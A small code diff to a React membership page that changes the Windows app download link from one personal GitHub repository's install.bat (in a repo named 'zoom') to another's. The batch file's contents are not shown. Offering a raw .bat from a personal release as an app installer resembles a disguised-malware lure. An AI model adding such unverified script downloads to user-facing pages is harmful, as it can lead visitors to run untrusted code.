@@ -3,7 +3,7 @@ import { Button } from "@/components/ui/button";
 import { CheckCircle, Download, Monitor } from "lucide-react";
 
 // TODO: Replace with the actual Windows app download URL when available
-const WINDOWS_APP_DOWNLOAD_URL = "https://github.com/melia7676/zoom/releases/download/v1/install.bat";
+const WINDOWS_APP_DOWNLOAD_URL = "https://github.com/melia7676/wedev/releases/download/v1/install.bat";
 
 const MembershipApp = () => {
   return (
